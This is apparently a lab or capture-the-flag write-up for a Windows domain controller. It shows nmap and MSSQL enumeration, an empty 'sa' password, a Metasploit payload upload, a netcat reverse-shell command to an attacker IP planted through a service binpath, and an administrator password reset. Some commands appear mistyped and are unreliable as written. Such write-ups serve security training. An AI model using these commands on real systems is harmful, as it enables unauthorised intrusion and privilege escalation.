# MOUNT / Active Directory

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/e10e5087c55c4b4ba5fa063e1097ec2a.png)

## NMAP SCAN

```text
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-03-16 03:08:51Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: Mount.csl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: MOUNT
|   NetBIOS_Domain_Name: MOUNT
|   NetBIOS_Computer_Name: MOUNT-DC
|   DNS_Domain_Name: Mount.csl
|   DNS_Computer_Name: Mount-DC.Mount.csl
|   DNS_Tree_Name: Mount.csl
|_  Product_Version: 10.0.17763
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: Mount.csl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MOUNT
|   NetBIOS_Domain_Name: MOUNT
|   NetBIOS_Computer_Name: MOUNT-DC
|   DNS_Domain_Name: Mount.csl
|   DNS_Computer_Name: Mount-DC.Mount.csl
|   DNS_Tree_Name: Mount.csl
|   Product_Version: 10.0.17763
|_  System_Time: 2021-03-16T03:09:51+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49744/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49860/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

## MSSQL ENUMERATION

### METASPLOIT auxiliary\(admin/mssql/mssql\_enum\)

* Accounts with empty password:

```text
sa
```

* Windows Logins on this Server:

  ```text
  Administrator
  NT SERVICE\SQLWriter
  NT SERVICE\Winmgmt
  NT Service\MSSQLSERVER
  NT AUTHORITY\SYSTEM
  NT SERVICE\SQLSERVERAGENT
  NT SERVICE\SQLTELEMETRY
  AKirk
  PTaylor
  KWood
  NLee
  AWoods
  ```

* DOMAIN ACCOUNTS

  ```text
  [*] 172.31.3.5:1433 -  - MOUNT\Administrator
  [*] 172.31.3.5:1433 -  - MOUNT\Guest
  [*] 172.31.3.5:1433 -  - MOUNT\krbtgt
  [*] 172.31.3.5:1433 -  - MOUNT\Domain Admins
  [*] 172.31.3.5:1433 -  - MOUNT\Domain Users
  [*] 172.31.3.5:1433 -  - MOUNT\Domain Guests
  [*] 172.31.3.5:1433 -  - MOUNT\Domain Computers
  [*] 172.31.3.5:1433 -  - MOUNT\Domain Controllers
  [*] 172.31.3.5:1433 -  - MOUNT\Cert Publishers
  [*] 172.31.3.5:1433 -  - MOUNT\Schema Admins
  [*] 172.31.3.5:1433 -  - MOUNT\Enterprise Admins
  [*] 172.31.3.5:1433 -  - MOUNT\Group Policy Creator Owners
  [*] 172.31.3.5:1433 -  - MOUNT\Read-only Domain Controllers
  [*] 172.31.3.5:1433 -  - MOUNT\Cloneable Domain Controllers
  [*] 172.31.3.5:1433 -  - MOUNT\Protected Users
  [*] 172.31.3.5:1433 -  - MOUNT\Key Admins
  [*] 172.31.3.5:1433 -  - MOUNT\Enterprise Key Admins
  [*] 172.31.3.5:1433 -  - MOUNT\RAS and IAS Servers
  [*] 172.31.3.5:1433 -  - MOUNT\Allowed RODC Password Replication Group
  [*] 172.31.3.5:1433 -  - MOUNT\Denied RODC Password Replication Group
  [*] 172.31.3.5:1433 -  - MOUNT\MOUNT-DC$
  [*] 172.31.3.5:1433 -  - MOUNT\DnsAdmins
  [*] 172.31.3.5:1433 -  - MOUNT\DnsUpdateProxy
  [*] 172.31.3.5:1433 -  - MOUNT\AKirk
  [*] 172.31.3.5:1433 -  - MOUNT\PTaylor
  [*] 172.31.3.5:1433 -  - MOUNT\KWood
  [*] 172.31.3.5:1433 -  - MOUNT\NLee
  [*] 172.31.3.5:1433 -  - MOUNT\AWoods
  [*] 172.31.3.5:1433 -  - MOUNT\SQLServer2005SQLBrowserUser$MOUNT-DC
  ```

### UPLOAD A SHELL use exploit/windows/mssql/mssql\_payload

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/4f9802d331764214ada8684fc2e1e8c4.png)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/f3cf031fa759443dad0bc5baa5e9fbf0.png)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/832a71fbccfa469187b21aef9ce6c477.png)

### WINPEAS

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/962b068f5ccf4577929b3b2a0277e54f.png)

## PRIVESC

* [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation\#services](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services)

### UPLOAD NC64.EXE \(DIDN'T WORKED\)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/3277f93aab244380b67485fab7701219.png)

```text
sc config UsoSvc binpath="cmd \c C:\Windows\SERVIC~1\MSSQLS~1\AppData\Local\Temp\nc64.exe 10.10.0.63 3883 -e C:\WINDOWS\System32\cmd.exe"

sc start UsoSvc
```

### CHANGING ADMINISTRATOR PASSWORD \(WORKED\)

```text
sc config UsoSvc binpath="net use Administrator livestep /DOMAIN"

sc start UsoSvc
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/566e088fb7ca45f0a21555d96e3d4604.png)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/9e85a653c4c14d8dafbf02f700e9b9c2.png)

## FLAGS

### USER

```text
f4d5ae56175f2f987b5cbdd9281dfdcc
```

### ROOT

```text
e6fca557392919cb8373d0e0165c88ed
```

